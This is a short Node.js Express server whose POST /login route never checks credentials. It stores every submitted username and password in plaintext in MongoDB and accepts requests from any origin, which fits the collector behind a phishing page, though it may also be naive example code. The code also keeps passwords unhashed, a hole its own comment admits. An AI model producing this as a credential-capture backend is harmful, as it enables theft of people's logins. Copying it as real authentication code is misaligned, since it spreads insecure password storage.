const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const mongoose = require('mongoose');
require('dotenv').config();


const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// MongoDB connection
const MONGO_URI = process.env.db; // Replace with your MongoDB URI
mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('MongoDB connection error:', err));

// Define a schema and model for login data
const loginSchema = new mongoose.Schema({
  username: String,
  password: String, // Do not store plaintext passwords in production! Use hashing.
  createdAt: { type: Date, default: Date.now },
});

const Login = mongoose.model('Login', loginSchema);

// Endpoint to handle login requests
app.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username and password are required' });
    }

    const loginData = new Login({ username, password });
    await loginData.save();

    res.json({ success: true, message: 'Data stored successfully!' });
  } catch (error) {
    console.error('Error saving login data:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
